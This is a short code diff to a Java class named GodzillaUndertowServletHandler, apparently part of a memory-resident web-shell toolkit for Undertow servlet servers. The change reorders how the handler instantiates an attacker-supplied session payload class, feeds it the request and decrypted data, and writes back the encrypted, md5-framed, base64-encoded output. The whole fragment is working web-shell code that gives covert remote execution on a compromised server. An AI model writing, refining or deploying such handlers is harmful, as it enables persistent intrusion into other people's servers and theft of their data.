@@ -47,11 +47,12 @@ public class GodzillaUndertowServletHandler extends ClassLoader {
                     request.getClass().getMethod("setAttribute", String.class, Object.class).invoke(request, "parameters", data);
                     ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                     Object f = ((Class<?>) sessionPayload).newInstance();
-                    PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
                     f.equals(arrOut);
                     f.equals(request);
-                    writer.write(md5.substring(0, 16));
+                    f.equals(data);
                     f.toString();
+                    PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
+                    writer.write(md5.substring(0, 16));
                     writer.write(base64Encode(this.x(arrOut.toByteArray(), true)));
                     writer.write(md5.substring(16));
                 }
